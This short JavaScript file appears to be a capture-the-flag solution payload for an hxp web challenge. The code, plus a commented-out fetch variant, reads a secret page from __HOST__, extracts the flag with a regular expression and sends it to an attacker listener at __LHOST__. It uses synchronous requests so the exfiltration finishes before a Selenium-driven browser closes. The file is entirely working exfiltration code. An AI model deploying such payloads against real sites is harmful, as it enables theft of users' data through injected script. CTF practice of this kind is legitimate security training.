// In browsers that keep the window open a bit, asynchronous fetch is good enough.
//     window.fetch('__HOST__/s/the-flag').then(r => r.text()).then(text => {
//         window.fetch('__LHOST__/' + /hxp\{[^}]+\}/.exec(text)[0]);
//     });
// However, here we need synchronous XHR because Selenium closes everything instantly.
$.ajax({url: '__HOST__/s/the-flag', dataType: 'text', async: false, success: function(data) {
    $.ajax({
        url: '__LHOST__/' + encodeURIComponent(/hxp\{[^}"]+\}/.exec(data)[0]),
        dataType: 'text',
        async: false
    });
}});

